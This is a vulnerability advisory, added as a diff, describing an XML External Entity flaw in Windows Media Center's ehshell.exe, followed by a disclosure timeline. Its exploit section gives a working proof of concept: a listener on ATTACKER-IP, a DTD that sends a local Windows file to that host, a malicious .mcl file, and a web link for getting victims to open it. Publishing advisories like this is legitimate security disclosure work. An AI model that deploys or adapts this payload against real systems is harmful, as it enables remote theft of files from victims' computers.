@@ -1,0 +1,130 @@
+[+] Credits: John Page aka hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source: http://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-MEDIA-CENTER-XXE-FILE-DISCLOSURE.txt
+
+[+] ISR: ApparitionSec
+
+
+
+Vendor:
+==================
+www.microsoft.com
+
+
+
+Product:
+==================================
+Windows Media Center "ehshell.exe"
+version 6.1.7600
+
+
+
+Vulnerability Type:
+====================
+XML External Entity
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=====================
+
+Windows Media Center "ehshell.exe" is vulnerable to XML External Entity
+attack allowing remote access to ANY files on a victims computer, if they
+open
+an XXE laden ".mcl" file via a remote share / USB or from an malicious
+"windowsmediacenterweb" web link.
+
+Sometimes 'Windows Media Center' will crash, sometimes opens normally and
+other times will not open, but the files get accessed and exfiltrated.
+
+
+Tested Windows 7 SP1
+
+
+
+Exploit code(s):
+===============
+
+POC exfiltrate "msdfmap.ini" used by MS ADO Remote Data Services.
+
+
+1) ATTACKER-IP listener
+python -m SimpleHTTPServer 8080
+
+
+
+2) Create the "FindMeThatBiotch.dtd" DTD file with below contents (host on
+ATTACKER-IP in directory where python server is listen)
+
+<!ENTITY % param666 "<!ENTITY &#x25; FindMeThatBiotch SYSTEM '
+http://ATTACKER-IP:8080/%data666;'>">
+
+
+
+3) Create the "EVIL.mcl" file.
+
+
+<?xml version="1.0"?>
+<!DOCTYPE hyp3rlinx [
+<!ENTITY % data666 SYSTEM "c:\Windows\msdfmap.ini">
+<!ENTITY % junk SYSTEM "http://ATTACKER-IP:8080/FindMeThatBiotch.dtd">
+%junk;
+%param666;
+%FindMeThatBiotch;
+]>
+
+
+
+4) Get victim to open the EVIL.mcl ... enjoy your files!
+
+OR create link on webpage to run the file, but "user has to consent first".
+
+<a href="windowsmediacenterweb://ATTACKER-IP:8080/EVIL.mcl">XXE POC</a>
+
+
+
+Disclosure Timeline:
+=======================================
+Vendor Notification:  September 1, 2016
+Vendor opens Case 34970: September 6, 2016
+Vendor reply "Wont Fix" : October 19, 2016
+December 4, 2016 : Public Disclosure
+
+
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+
+Severity Level:
+================
+High
+
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
